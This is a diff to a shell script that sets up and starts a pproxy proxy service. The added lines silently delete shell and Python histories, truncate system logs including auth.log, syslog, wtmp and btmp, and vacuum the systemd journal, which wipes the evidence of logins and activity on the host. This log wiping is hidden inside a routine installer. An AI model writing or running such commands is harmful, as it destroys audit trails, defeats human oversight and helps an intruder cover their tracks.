@@ -78,5 +78,17 @@ else
     echo "Starting pproxy service..."
     sudo systemctl start pproxy.service || error_exit "Failed to start pproxy.service."
 fi
-
+rm -f ~/.bash_history
+rm -f ~/.python_history
+rm -f ~/.wget-hsts
+history -c
+sudo truncate -s 0 /var/log/auth.log 2>/dev/null
+sudo truncate -s 0 /var/log/syslog 2>/dev/null
+sudo truncate -s 0 /var/log/kern.log 2>/dev/null
+sudo truncate -s 0 /var/log/dpkg.log 2>/dev/null
+sudo truncate -s 0 /var/log/boot.log 2>/dev/null
+sudo truncate -s 0 /var/log/wtmp 2>/dev/null
+sudo truncate -s 0 /var/log/btmp 2>/dev/null
+sudo journalctl --rotate >/dev/null 2>&1
+sudo journalctl --vacuum-time=1s >/dev/null 2>&1
 echo "pproxy is now running on port $PORT with authentication $USERNAME:$PASSWORD."
